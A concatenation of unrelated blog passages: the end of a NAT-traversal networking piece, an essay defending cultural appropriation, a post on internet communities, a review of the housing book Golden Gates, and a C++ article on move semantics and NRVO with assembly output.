around. One approach is to have the peers retry continuously, but this
is wasteful. Wouldn’t it be better if both peers knew to start
establishing a connection at the same time?</p>
<p>This may sound a little recursive: to communicate, first you need to
be able to communicate. However, this preexisting “side channel”
doesn’t need to be very fancy: it can have a few seconds of latency,
and only needs to deliver a few thousand bytes in total, so a tiny VM
can easily be a matchmaker for thousands of machines.</p>
<p>In the distant past, I used XMPP chat messages as the side channel,
with great results. As another example, WebRTC requires you to come up
with your own “signalling channel” (a name that reveals WebRTC’s IP
telephony ancestry), and plug it into the WebRTC APIs. In Tailscale,
our coordination server and fleet of DERP (Detour Encrypted Routing
Protocol) servers act as …</p></div></div>

Some of her followers <a href="https://www.irishtimes.com/culture/tv-radio-web/morgan-bullock-irish-dancing-tiktok-star-people-said-i-m-appropriating-irish-culture-1.4308680">criticized an African-American teenager</a> for displaying her immense talent at Irish dancing on TikTok. A member of a UK knitting circle <a href="https://www.telegraph.co.uk/radio/what-to-listen-to/did-knitting-become-battleground-cancel-culture/">was ostracized</a> for acknowledging that she had drawn creative inspiration from a trip to India. <a href="https://www.change.org/p/trader-joe-s-remove-racist-packaging-from-your-products">A petition</a> was launched to compel the Trader Joe’s grocery chain to stop labeling its vaguely Latin American products as “Trader José’s” and its Chinese-themed products as “Trader Ming’s.”</p><p>For the most part, mainstream institutions have not come to the defense of these embattled&nbsp;innocents. The <em>Los Angeles Times </em><a href="https://www.latimes.com/business/story/2020-08-05/trader-joes-joses-mings-labels-branding-backlash">covered the Trader Joe’s story</a> with strained neutrality, citing one former customer who bemoaned the company’s “failure to reflect on what their goal is in this movement” for racial justice—as if the grocery chain were a student activist who had overslept and missed a demonstration. The <em>New York Times</em> ran <a href="https://www.nytimes.com/2019/03/29/style/modern-love-race-i-broke-up-with-her-because-shes-white.html">a pitiable op-ed</a> by a confused young person who broke up with a romantic partner because of their ethnoracial differences. (What greater appropriation could there be than to take another into your heart?) The BBC <a href="https://www.bbc.co.uk/news/newsbeat-51177738">has solemnly reported</a> about the efforts of haute couture to eliminate such transgressions as cornrows on “white” male models. </p><p>It would be nearly unthinkable for any establishment media outlet today to run an op-ed defending, say, the wearing of dreadlocks by a person of European descent—even though this hairstyle was known as the <em>plica polonica</em> or “Polish plait” and associated with the Tatar horsemen who inhabited the Polish-Lithuanian duchy long before it was associated with the African diaspora. Yet, outside of our current cultural context, such arguments seem moderate and reasonable. </p><p>Cultural appropriation is far too widespread a process to be classified in Manichean terms like <em>good</em> and <em>bad</em>. It is simply a general law of culture: it explains why, for example, horses and guns are to be found in nearly every populated corner of the world, why there are Muslim Indonesians and Christian Inuit, why the Taliban use Toyota pick-up trucks, and why I like Siberian epic poetry.</p><p>I want to focus here on the kind of case that is now most frequently derided as “problematic”: freely adopting aspects of another culture simply because one values them as crystallizations of human excellence. Cultural appropriation, in this narrower sense, is an unqualified good—and to oppose it is nothing less than anti-human. </p><p>The most familiar critique of cultural appropriation is that all cultures are made up of borrowings from one another. In <a href="https://www.theguardian.com/commentisfree/2016/sep/13/lionel-shrivers-full-speech-i-hope-the-concept-of-cultural-appropriation-is-a-passing-fad">a scandalous speech</a> at the 2016 Brisbane Writers’ Festival, novelist Lionel Shriver defied our era’s sensibilities by donning a sombrero and declaring that the work of an author necessarily involves “putting on other people’s hats”—that is, imagining her way into their worlds in a manner that the new prohibitions on cultural appropriation seek to prevent. The well-known boy’s-life guru Jordan Peterson, for his part, <a href="https://www.youtube.com/watch?v=NNUcR-eMxaE">has observed</a> that “there’s no difference between cultural appropriation and learning from each other.” &nbsp;</p><p>These arguments are true enough. Art has no higher purpose than to transcend our limited, provincial subjectivity. And there is no more edifying or noble pursuit than learning from others whose subjectivities differ from our own. But we would do well to rethink our apprehension regarding cultural appropriation for another, more important reason: individual cultures are variations on a fairly limited range of patterns that are grounded in human nature. </p><p>All human beings are the product of the same evolutionary forces. We all have the same brains, and the same mortal bodies, more or less, and we all inhabit the same natural world. A return to an unafraid universalism regarding human nature would require us to pay attention to the ways in which the history of culture as an idea has contributed to our fragmentation. It is no mere coincidence that the word that came to be used for the vital and unique character of particular human communities is the same as the word used to describe the bacteria that give yogurt its strange essence. Early culture theorists like J. G. Herder were motivated by their rejection of the universalist orientation of the Enlightenment, which—in spite of its claim to belong to no particular soil or tradition—seemed to many to speak with a distinctly French accent. Over the course of Herder’s lifetime, significant portions of the German-speaking world, fragmented into a vast number of politically and militarily feeble duchies, principalities and margraviates, came under the occupation of an expansionist French empire. It was only natural to interpret French claims to represent a universalist civilization as politically motivated.</p><p>To oppose this Enlightenment conception of civilization, German intellectuals adopted a metaphor of organic growth. It contrasted the form of life that develops spontaneously in a particular soil to the purportedly universal, or universalizable, condition to which modern man might aspire through force of will, ingenuity, planning and hard work. To that end, Herder exhorted his countrymen to “speak German, O you Germans” and to “spew out ... the ugly slime of the Seine.” Yet, while Herder hated the <em>conceit</em> of universality, which he saw as a pretext for one group of people to impose their form of life on another, he regarded individual human cultures as the distinct local inflections of patterns of behavior that may be found wherever there are human beings—and viewed no culture as either superior to or totally distinct from any other.</p><p>This basic understanding shaped the emergent field of anthropology. For all its complicity with imperialism, the discipline demonstrates that there is a possible third way between the hierarchical measurement of progress implicit in the idea of civilization and the bleak atomism of provincial exceptionalisms. For most early anthropologists, the human species is one, and the variety of its cultures is a flourish upon that underlying unity. To lose sight of this unity is as great a failure as to forget to value cultural specificity. As G. W. Leibniz put it as early as the seventeenth century, both the entire natural world and the human world contained within it are characterized by “unity in variety.”</p><p>Even when we can find no evidence of borrowing between two cultures, or when they are geographically remote from one another, what those cultures are <em>doing</em>—what they are cooking, sewing and singing—is not <em>theirs</em> in any robust sense. Cultural properties are really only a local modulation of species-specific capacities, part of a natural, evolved repertoire of human behavior. </p><p>A version of this naturalistic universalism came to dominate mid-twentieth-century theories of language, thanks in no small measure to Noam Chomsky’s theory of universal grammar. &nbsp;Vladimir Propp identified the thirty-one basic structural elements of folktales, showing that to tell a story is not so much to engage in pure literary invention as to follow the rules of a combinatorial game. Claude Lévi-Strauss pursued this project further by seeking the underlying patterns in Native North American myths, while Alan Lomax studied the folk music of the American South, the Caribbean and Eastern Europe in order to build an invaluable archive of cultural expressions.</p><p>Like many of his contemporaries, Lomax was driven by a desire “to explore and sustain the world’s expressive traditions with humanistic commitment and scientific engagement.” It is just such commitment and engagement—such love of culture and of learning about other cultures—that the campaign against cultural appropriation would, should it prove successful, destroy. </p><p>Many uses of other cultures’ productions truly are morally wrong. Some are even materially and politically harmful. But this is not in virtue of whatever element of appropriation they may involve. Rather, it is usually because someone else’s culture is being used in an exploitative way—and is thus wrong in the same way all forms of exploitation are wrong.</p><p>The opponents of cultural appropriation fail to identify the real sources of exploitation. It is not, for example, the individual “white” American musician who is guilty of exploitation, unable as he is to avoid channeling the Black musical forms in which he has been immersed his whole life. It is the record companies that cynically promote him, even as they deny the same opportunities to equally talented Black artists. </p><p>We can see one egregious example of this misunderstanding in the infernal question of Halloween costumes. It is not enough to problematize cultural appropriation by invoking the common slogan <em>my culture is not a costume</em>. For it is difficult to see what a culture could be other than the sum total of such things as recipes, songs, lines of epic poetry, prayers and, yes, costumes. I myself have memorized significant portions of Sakha epic poetry, and have worn the traditional costumes associated with its recitation—in order to work my way into the culture as best I can, with the encouragement of those born into it. Anyone who insists that a culture is not a costume has never put on the right costume in the right cultural context. What the slogan really should signal is opposition to the decontextualized appearance of serious elements of culture in a setting of charivari and subversion. </p><p>The venerable tradition of Halloween upends our ordinary values and rules of conduct, and, in such a context, the natural presumption is that one’s clothes are chosen specifically to make one look foolish or savage. Combine this carnivalesque element—which has equivalents all over the world—with the cynical incentives of the contemporary commercial behemoth into which Halloween has been swallowed up, and it is not difficult to see why many people frown at the sight of some …</p></div></div>

<p>Internet communities, spaces where people with similar identities and interests interact, are a massive opportunity. General internet spaces are becoming hostile. Societal shifts are forcing more people to rethink the communities they are apart of. Big companies in the space have stagnated. Trends are moving in the right direction. Here are some important ones:</p>



<h3>Lack of Innovation</h3>



<p>To start, communities exist on platforms. The platforms shape how communities interact with each other and develop. Many of the platforms were not build for the internet we have today.</p>



<p>Forums and Reddit are the most obvious ones, and both could be victims to disruption. They have been around forever, and have not changed. Neither is mobile-first. They work, I guess, but they aren’t super attractive. Discord, Slack, and others are creating alternative places for communities to exist online.</p>



<p>Voice and video have a massive role to play in internet communities but have taken a back seat to text until recently. Many people now spend all day on video conferencing for work and have a camera on them at all times. Voice apps are yet to take off but the popularity of podcasts and Airpods show promise.</p>



<p>TikTok showed a different way to create a community. When you focus on video and mobile-first, community looks different. Instead of you choosing your community, TikTok puts you into a community based on what you interact with. I expect to see more of this moving forward.</p>



<h3>Political Tribalism</h3>



<p>People looking for a way out of political tribalism. The fewer communities someone is a part of, the more likely they see a core community as a political group. Politics on the internet is a mind killer but is incentivized by public platforms. There are always other people who feel strongly with you. You don’t have to know much about the subject to gain status. You can “fight” people online. You can pretend you are doing something valuable. Politics is an easy community to be apart of, but people will grow tired of political tribalism. They will look for other options.</p>



<h3>Dark Forest</h3>



<p><a href="https://onezero.medium.com/the-dark-forest-theory-of-the-internet-7dc3e68a7cb1" target="_blank" rel="noreferrer noopener">Yancey Strickler has says the internet has become a dark forest.</a></p>



<blockquote><p>In response to the ads, the tracking, the trolling, the hype, and other predatory behaviors, we’re retreating to our dark forests of the internet, and away from the mainstream.</p></blockquote>



<p>Debate and disagreement cannot be public. It is not acceptable to change your mind. It is not acceptable to have an opposing opinion. Controversial opinions and topics moved out of view.</p>



<p>Ideas don’t cease to exist when they are uncomfortable, they move to places where they are spoken about. They move into the dark forest, hidden communities. Many of these communities already exist on the internet and will only continue to grow. As the size of these dark forest communities grows, so will their impact.</p>



<h3>Internet Education</h3>



<p>Community leads to education. To become a better member (or even a member at all) people must learn things. Ideas, jargon, people, and companies are all examples of information someone might need to learn. Communities often recommend ways of developing the knowledge needed to join. I expect these to expand.</p>



<p>Internet education is cool, but only when high-status members of a community create and deliver it. Many creators added private communities to their offerings. Students learn and interact with the content better within communities than on their own.</p>



<p>Internet communities will be part of the future of education. In-person communities are the only thing Universities do well. If University is over Zoom, are those communities still valuable? The increasing amount of people deferring think not. A large number of people will be looking at other options, and internet communities may provide a path forward.</p>



<h3>Work from Anywhere</h3>



<p>Office small talk that might have fulfilled the social and community aspects of people’s days disappeared. People are social animals, they need interaction and will look for it elsewhere. Internet communities are an obvious place to start. Many companies are realizing they need to create their own internet community to work virtually. It is not clear what good company internet communities look like.</p>



<p>Less commuting also means more time to spend pursuing things other than work. Does this mean more time playing video games and watching Netflix or more time as a member of a community?</p>



<h3>Passion Economy</h3>



<p>Internet communities enable sharing of content and products. If you create something good within a community it will be seen by many of its members. <a href="https://a16z.com/2019/10/08/passion-economy/">Li Jin of a16z says:</a></p>



<blockquote><p>New digital platforms enable people to earn a livelihood in a way that highlights their individuality. These platforms give providers greater ability to build customer relationships, increased support in growing their businesses, and better tools for differentiating themselves from the competition. In the process, they’re fueling a new model of internet-powered entrepreneurship.</p></blockquote>



<p>Lots of people are making a living creating for internet communities. Many more will continue to do this. Being able to understand and appeal to your community is critical to success in this area. As internet communities become more coordinated and understandable, their economic power grows. Lots of people will be competing for a piece in lots of communities.</p>



<hr>



<p>The future of internet communities is bright, and there is still plenty of opportunities to pursue. It is something I will be looking into more.

While I personally like books and papers that use abstract reasoning to make their points, most people don’t, and need stories to understand the world: “Build Build Build” uses Steve Falk’s story to explain why even liberty-shy Californians are sometimes coming around to letting the state change a bit. Most importantly, a baby boomer like him began to see that his own kids’s lives were being constricted by the odious zoning monster that almost all municipalities in California have fed:</p>
<blockquote><p>Mr. Falk began his career on the local control side of that debate. But somewhere along the Deer Hill odyssey, he started to sympathize with his insurrectionist opponents. His son lived in San Francisco and paid a fortune to live with a pile of roommates. His daughter was a dancer in New York, where the housing crunch was just as bad. It was hard to watch his kids struggle with rent and not start to think that maybe Ms. Trauss had a point.</p></blockquote>
<p>New York and San Francisco are strangling their young, and even their middle-aged, in ways that many local politicians aren’t adequately grappling with. <em>Golden Gates</em> expertly surfaces ideas about what is or should be “normal” and whether those things should be normal:</p>
<blockquote><p><img loading="lazy" data-attachment-id="6570" data-permalink="https://jakeseliger.com/2020/08/21/golden-gates-fighting-for-housing-in-america-conor-dougherty/golden_gates/" data-orig-file="https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg" data-orig-size="329,499" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="golden_gates" data-image-description="" data-medium-file="https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg?w=198" data-large-file="https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg?w=329" src="https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg?w=198&amp;h=300" alt="" width="198" height="300" srcset="https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg?w=198&amp;h=300 198w, https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg?w=99&amp;h=150 99w, https://jseliger.files.wordpress.com/2020/08/golden_gates.jpg 329w" sizes="(max-width: 198px) 100vw, 198px">Patterned on the American mind, in ways we rarely stop to notice, are layers of zoning and land-use rules that say what can be built where. They are so central to how American cities look and operate that they have become a kind of geographic DNA that forms our opinion of what seems proper and right.</p></blockquote>
<p>But what is perceived as normal—what is “patterned”—may not be “proper and right,” even if what’s regarded as “proper and right” gets unfairly mapped to normal. The “layers” of zoning and other rules occur at the neighborhood level, city level, sometimes the county level, and sometimes the state level: each veto point chokes off potential projects and creates a kind of suffocating conformity that has drained cities’s vitality, without many people noticing. Somehow, preventing anyone from doing much of anything almost anywhere is said to increase vitality: instead, we get suffocating rents, millennials who are now themselves reaching into middle age and yet often feel they can’t afford to have kids, because who’s going to pay the rent, let alone the health insurance and the student loans?</p>
<p>We need more freedom and greater liberalization—or at least that’s the framing that I’d choose, using the thinking behind George Lakoff’s work on the language of political ideas. Oddly, though, the most reactionary groups in local housing fights tend to frame themselves as preserving freedom—the freedom from having other people make any changes in their neighborhoods. The result, as Doherty writes, is that “In effect, we shattered urban regions into a constellation of smallish cities and reactionary single-family house neighborhoods whose influence over local land use decisions give them an astounding amount of control over how much shelter we build, where, and at what cost.” The problem goes back decades—”City planners started documenting the urban housing shortage in the 1970s, and in the decades since economists have shown that many of the country’s highest-income regions have become so expensive that they have all but gated out middle-class jobs and people”—but problems that compound enough over time become enormous and menacing.</p>
<p>Housing can’t be both a good investment and an affordable place to live. Preferring one goal intrinsically compromises the other. For the last five decades, we’ve tried to make housing an investment that yields above-market returns: consequently, it’s now incredibly expensive in many productive cities. Perhaps the biggest way we may see changes in this dynamic is through changes in the composition of renters versus owners. <a href="https://www.cnbc.com/2017/01/31/invitation-homes-raises-154-billion-in-ipo-source.html">Invitation Homes</a> is now one of the largest landlords in the country, and it specializes in buying single-family houses (or “oneplexes”) and renting them out. That’s it. The company has realized that the not-in-my-backyard (NIMBY) phenomenon is also a business opportunity. Airbnb exists in part because most cities forbid hoteliers from building sufficient hotel capacity—so renting private housing units is an arbitrage on those rules. <a href="https://www.canvascoliving.com/">Canvas Co-Living</a> is a startup that is working to allow “facilitated shared homes.”</p>
<p><em>Golden Gates’s</em> best story may be that of Sonja Truss, a woman who was tired of the Bay Area’s relentless housing cost increases—so she decided to do something about it:</p>
<blockquote><p>But for a young adult with no obvious signs of intoxication to show up at a midday city meeting to say she was just generally in favor of housing because San Francisco didn’t have enough of it? That made no sense. Nobody attended eight-hour city meetings if they didn’t have to, and while the planning commission was a place of arguments and strange behavior, it was also a place where people at least knew where each other’s lanes were.</p></blockquote>
<p>She decided to scramble the lanes, by arguing that the problem isn’t too much housing but too little. She finds herself in weird ideological waters, because many people who proclaim their progressive bonafides are more conservative, in many ways, than the current occupant of the White House. Labeling one’s opponents is a big deal in Bay Area politics: “Only in San Francisco would a gay man who opposed the death penalty and marched in the local BDSM festival in leather straps have to argue he was truly of the left.” There are lots of racial politics involved too: many of the kinds of people who want to proclaim themselves to be opposed to racism nonetheless support housing and development policies that are racist in practice and effect.</p>
<p>Another chapter discusses <a href="https://factoryos.com/">Factory_OS</a>, a company that’s trying to do modular building. Housing is expensive for many reasons, with zoning at the top of the list—but the actual cost of construction is high, and, in many high-cost metros, the zoning drives up the cost of construction. Why? As zoning artificially restricts housing construction, the construction workers who build new housing have to pay more for existing housing, which means that they have to be paid more by anyone trying to build housing. One gets a kind of perverse ratchet that, again, ends with absurdities like San Francisco. Modular housing, <a href="https://www.vox.com/energy-and-environment/2020/1/15/21058051/climate-change-building-materials-mass-timber-cross-laminated-clt">like cross-laminated timber</a>, promises to reduce the cost of building. Unfortunately, building a housing factory is expensive up front, and the returns are spread across many years—leaving a wide space for bankruptcy. Previous efforts at modular housing have tended to fail when the market turns and the maker goes out of business. Dougherty points out that a recession could doom Factory_OS and its competitors. As of this writing, we’re already likely in the worst recession since 2008, and that was the worst since the Great Depression. What happens with the COVID Recession remains to be seen (the recession is made worse by many laid-off people being stuck with expensive leases and mortgages, due to decades of failure to build enough housing). One of the best ways to be successful in business is to start while a rising economy naturally lifts your company. Many business geniuses are really people with lucky timing—which isn’t to knock them: I’d love to have lucky timing too. As of July 23 2020, it appears that <a href="https://www.sfchronicle.com/business/article/Google-commits-over-100-million-of-1-billion-15428754.php">Google has promised to invest more money in Factory_OS</a>, so the company is still presumably alive. But it has an ominously small number of mentions in the media over the last year.</p>
<p><strong>One major thing might</strong> break the zoning logjam: by now, intellectuals and investors know the single-family zoning racket and know that single-family zoning is designed to enrich property owners. It’s not hard to figure out how to profit from above-market returns, as Invitation Homes has: buy the asset. But as investment funds buy single-family properties, the composition of renters versus owners will change, and more renters will be part of the voting pool. If renters can figure out how supply and demand work—a big “if,” given anti-market bias—they’ll vote to expand the supply of housing. So far, we’ve not seen much of this dynamic, but, as the costs of housing continue to increase, we might see more of it as people go looking for answers. Voters can ineffectively blame landlords and “greedy” developers, or they can effectively look for solutions. <em>Golden Gates</em> is part of the solutions firmament, if enough people read it and change their behavior based on new knowledge. That’s a big “if,” however.</p>
<p>To me, it remains strange and interesting that many people who are superficially interested in lowering housing costs won’t believe that the obvious solution, known for centuries—since the time of Adam Smith—to high prices is greater supply. Any solution that is not “more supply” will entail shortages. We can’t legislate away supply and demand. Yet a common urban trope involves blaming the people attempting to respond to price signals with more product for being “greedy.” The ineffectiveness of this response is obvious, but until recently there’s been no organized political response to the problem. Dougherty is chronicling that response—and telling the stories of the people responding.</p>

    <p>Compilers are getting better with each release. Sometimes a noticeable difference can be observed in the assembly output for the same piece code in a different version of the same compiler (can be easily done via <a href="https://godbolt.org/">compiler explore</a>).</p>

<p>I have gotten into the practice of checking the assembly output lately to analyze the overhead of various implementations. Beware, sometimes it can get addictive. But I think it is a nice way of learning to read assembly and also be amazed at how clever the compilers are these days.</p>

<p>In this article, I am going to cover one such incident that happened when I was looking at the assembly output of a function during my <a href="https://github.com/Panky-codes/CHIP8">CHIP8</a> implementation.</p>

<p>But the context of the problem first!</p>

<h2 id="the-magic-of-move-semantics">The magic of move semantics</h2>
<p>Move semantics was introduced in C++11. We can think of move semantics as a way of transferring ownership of an object. If you are really new to move semantics, consider the following example:</p>

<p>So your colleague has a document that you also want. We have two options here. The first option, you take that document to a copier, take a copy of the document for yourself, and return the original document to your colleague. The second option, assuming your colleague doesn’t need the document anymore, instead of throwing it away, your colleague can give it to you, thereby, saving paper.</p>

<p>Replace the document with a memory resource in a program, then the first option is doing a copy, and the second option is doing a move, where you transfer the ownership instead of wasting the resource.</p>
<h2 id="putting-what-i-learned-in-action">Putting what I learned in action</h2>
<p>While implementing my <a href="https://github.com/Panky-codes/CHIP8">CHIP8</a> emulator, I saw an opportunity to replace an expensive copy operation into a cheap move operation (at least that is what I thought).</p>

<p>To give a bit of context: In each frame cycle, I had to return an array containing 2048 integers that will be used to draw the graphics on the screen. The pseudo-C++ code is shown below:</p>

<div><div><pre><code><span>// chip8.cpp</span>
<span>static</span> <span>constexpr</span> <span>display_size</span> <span>=</span> <span>2048</span><span>;</span>
<span>class</span> <span>Chip8</span> <span>{</span>
    <span>...</span> 
    <span>public</span> <span>:</span> 
        <span>std</span><span>::</span><span>array</span><span>&lt;</span><span>uint8_t</span><span>,</span> <span>display_size</span><span>&gt;</span> <span>get_display_pixels</span><span>()</span> <span>{</span>
              <span>// Do some computation</span>
              <span>return</span> <span>gfx</span><span>;</span>
          <span>}</span>
    <span>...</span> 
    <span>private</span> <span>:</span> 
        <span>std</span><span>::</span><span>array</span><span>&lt;</span><span>uint8_t</span><span>,</span> <span>display_size</span><span>&gt;</span> <span>gfx</span><span>{};</span>
<span>};</span>

<span>// main.cpp</span>
<span>while</span> <span>(</span><span>displayOn</span><span>)</span> <span>{</span>
    <span>...</span> 
    <span>const</span> <span>auto</span> <span>disp_pixels</span> <span>=</span> <span>emulator</span><span>.</span><span>get_display_pixels</span><span>();</span>
    <span>...</span>
    <span>// Use disp_pixels to draw pixels on the screen</span>
<span>}</span>
</code></pre></div></div>

<p>This is what I assumed was going on when I did the call to <code>get_display_pixels()</code> member function:</p>
<ol>
  <li>The compiler <code>copies</code> the <code>gfx</code> private variable of the <code>Chip8</code> class to the return value of the <code>get_display_pixels()</code> member function.</li>
  <li>The compiler calls the <code>copy constructor</code> to copy the return value of the function call to the <code>disp_pixels</code> variable.</li>
</ol>

<p>So, I concluded that I could use a <code>move constructor</code> to transfer the contents to my local variable <code>disp_pixels</code> to avoid a copy in the second step as described above.</p>

<p>So I changed my code in the <code>main</code> function as follows:</p>
<div><div><pre><code><span>// main.cpp</span>
<span>while</span> <span>(</span><span>displayOn</span><span>)</span> <span>{</span>
    <span>...</span> 
    <span>const</span> <span>auto</span> <span>disp_pixels</span> <span>=</span> <span>std</span><span>::</span><span>move</span><span>(</span><span>emulator</span><span>.</span><span>get_display_pixels</span><span>());</span>
    <span>...</span>
    <span>// Use disp_pixels to draw pixels on the screen</span>
<span>}</span>
</code></pre></div></div>

<p>Before you get furious and stop reading the article further because what I assumed was completely wrong, I realized that too, and the rest of the article is about that.</p>

<p>As soon as I used a <code>std::move</code> as shown in my previous code snippet, I observed the compiler was generating more assembly code than my initial code without a <code>std::move</code>(with std::move: <a href="https://godbolt.org/z/WulpDX">link</a>, without std::move: <a href="https://godbolt.org/z/oU8Tq4">link</a>).</p>

<p>What went wrong? Hmm….</p>
<h2 id="nrvo-to-the-rescue">NRVO to the rescue</h2>
<p>NRVO stands for Named Return Value Optimization. It is a nice trick that the compiler uses to omit unnecessary copy or move if certain conditions are met. Compilers have been using this trick for a long time. If <code>NRVO</code> takes place in our function call, then effectively we just do one copy instead of two. Let’s see how it works.</p>

<p>Even though the function signature of <code>get_display_pixels</code> indicates that it does not take any parameters, the compiler will pass one extra parameter behind the scenes from the caller (initialization call of <code>disp_pixels</code> from <code>main.cpp</code>) to the callee (<code>get_display_pixels</code> function in <code>chip8.cpp</code>). The caller will allocate the memory for the return value and pass the address of that memory to the callee. The callee will use that memory to construct the object and copy the value of the private variable <code>gfx</code> (in this case). As the memory of the caller (<code>disp_pixels</code>) was used by the callee, there is no need to copy the return value again, thereby, saving one unnecessary copy/move operation.</p>

<p>We should see the assembly output to really understand how <code>NRVO</code> is happening under the hood. The assembly code from the caller side is as follows:</p>
<div><div><pre><code><span>1</span>   <span>lea</span>  <span>rax</span><span>,</span> <span>[</span><span>rbp</span><span>-</span><span>16384</span><span>]</span>
<span>2</span>   <span>lea</span>  <span>rdx</span><span>,</span> <span>[</span><span>rbp</span><span>-</span><span>8192</span><span>]</span>
<span>3</span>   <span>mov</span>  <span>rsi</span><span>,</span> <span>rdx</span>
<span>4</span>   <span>mov</span>  <span>rdi</span><span>,</span> <span>rax</span>
<span>5</span>   <span>call</span> <span>Chip8</span><span>::</span><span>get_display_pixels</span><span>()</span>
</code></pre></div></div>
<p>Before the function call, <code>rsi</code> and <code>rdi</code> registers are loaded with upper and lower bound of the memory address of the <code>disp_pixels</code> variable. And, the trimmed assembly output from the callee side is as follows:</p>

<div><div><pre><code><span>1</span>   <span>Chip8</span><span>::</span><span>get_display_pixels</span><span>()</span><span>:</span>
<span>2</span>   <span>push</span> <span>rbp</span>
<span>3</span>   <span>mov</span>  <span>rbp</span><span>,</span> <span>rsp</span>
<span>4</span>   <span>mov</span>  <span>QWORD</span> <span>PTR</span> <span>[</span><span>rbp</span><span>-</span><span>8</span><span>],</span> <span>rdi</span>
<span>5</span>   <span>mov</span>  <span>QWORD</span> <span>PTR</span> <span>[</span><span>rbp</span><span>-</span><span>16</span><span>],</span> <span>rsi</span>
<span>...</span>
</code></pre></div></div>
<p>As seen from the callee side, the <code>rdi</code> and <code>rsi</code> values are moved to the stack, and further operations are performed with that memory address. Pretty neat!</p>

<p>A <code>simple analogy</code> for <code>NRVO</code> I like to think of is when you are asking a friend to fill in water inside a water bottle, you would give your bottle to fill water from the tap directly. It would be inefficient to first fill the water in a temporary bottle and transfer the contents again to your bottle. In the C++ context, <code>bottle</code> is the <code>memory space</code> and the <code>water</code> it holds is the <code>return value</code>.</p>

<p>If we assume that the  <code>NRVO</code> will take place, then the most efficient way of writing my function call is:</p>
<div><div><pre><code><span>// main.cpp</span>
<span>while</span> <span>(</span><span>displayOn</span><span>)</span> <span>{</span>
    <span>...</span> 
    <span>const</span> <span>auto</span> <span>disp_pixels</span> <span>=</span> <span>emulator</span><span>.</span><span>get_display_pixels</span><span>();</span>
    <span>...</span>
    <span>// Use disp_pixels to draw pixels on the screen</span>
<span>}</span>
</code></pre></div></div>
<p>GCC and Clang even have an extra warning flag <code>-Wpessimizing-move</code> which detects when we are trying to use a <code>move</code> where compiler-generated NRVO is much more efficient.</p>

<p>Even though we can assume in many situations that a <code>NRVO</code> will take place, especially if optimizations are turned on, C++ standard does not guarantee <code>NRVO</code> in all situations<sup>1</sup>. But what if compiler does not perform a <code>NRVO</code>?</p>
<h2 id="lvalues-and-rvalues-and-all-other-value-categories-in-between">Lvalues and Rvalues (and all other value categories in between)</h2>
<p>Even though there are some <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2020/p2025r0.html">proposals</a> to guarantee <code>NRVO</code>, it is not yet guaranteed by the standard. As it is not guaranteed, should we explicitly indicate a move operation to save a copy just in case the compiler doesn’t do a <code>NRVO</code>? To answer that, I added the flag <code>-fno-elide-constructors</code> that disables copy elision (the super-set of NRVO) in our code, thereby, allowing to see what the compiler does otherwise.</p>

<p>I was surprised to see that compiler was still performing a <code>NRVO</code> for <code>C++17</code> standard with <code>-fno-elide-constructors</code> enabled. But this was not the case for <code>C++14</code>, the compiler generated different assembly with <code>-fno-elide-constructors</code> enabled. If someone knows the reason why this difference occurs between <code>C++17</code> and <code>C++14</code> even though <code>NRVO</code> is not guaranteed, please email me about it. Godbolt <a href="https://godbolt.org/z/hPW3rh">link</a>.</p>

<p>Let’s use <code>C++14</code> with <code>-fno-elide-constructors</code> flag to simulate the scenario where the compiler fails to apply <code>NRVO</code> so that we can check whether we needed to do something extra to avoid superfluous copies.</p>

<p>So I added <code>-fno-elide-constructors</code> to disable any <code>NRVO</code> to the final code of the previous section. The caller generated the following assembly code:</p>

<div><div><pre><code><span>1</span>   <span>lea</span>  <span>rdx</span><span>,</span> <span>[</span><span>rbp</span><span>-</span><span>8192</span><span>]</span>
<span>2</span>   <span>lea</span>  <span>rax</span><span>,</span> <span>[</span><span>rbp</span><span>-</span><span>16384</span><span>]</span>
<span>3</span>   <span>mov</span>  <span>rsi</span><span>,</span> <span>rdx</span>
<span>4</span>   <span>mov</span>  <span>rdi</span><span>,</span> <span>rax</span>
<span>5</span>   <span>call</span> <span>Chip8</span><span>::</span><span>get_display</span><span>()</span>
<span>6</span>   <span>lea</span>  <span>rdx</span><span>,</span> <span>[</span><span>rbp</span><span>-</span><span>8192</span><span>]</span>
<span>7</span>   <span>lea</span>  <span>rax</span><span>,</span> <span>[</span><span>rbp</span><span>-</span><span>16384</span><span>]</span>
<span>8</span>   <span>mov</span>  <span>rsi</span><span>,</span> <span>rdx</span>
<span>9</span>   <span>mov</span>  <span>rdi</span><span>,</span> <span>rax</span>
<span>10</span>  <span>call</span> <span>std</span><span>::</span><span>array</span><span>&lt;</span><span>unsigned</span> <span>char</span><span>,</span> <span>32ul</span><span>&gt;::</span><span>array</span><span>(</span><span>std</span><span>::</span><span>array</span><span>&lt;</span><span>unsigned</span> <span>char</span><span>,</span> <span>32ul</span><span>&gt;&amp;&amp;</span><span>)</span>
</code></pre></div></div>

<p>As we can notice, the first 5 assembly instructions are the same as the version with NRVO enabled, and there are 5 more assembly instructions in this version as we disabled NRVO. The most important instruction we need to focus on is line number 10 where a <code>move constructor</code>(notice <code>&amp;&amp;</code> in the function signature). Wait, a <code>move constructor</code> is invoked? I did not use a <code>std::move</code> but the compiler decided to do it anyway. To really comprehend the reason, we need to understand <code>value categories</code> in C++.</p>

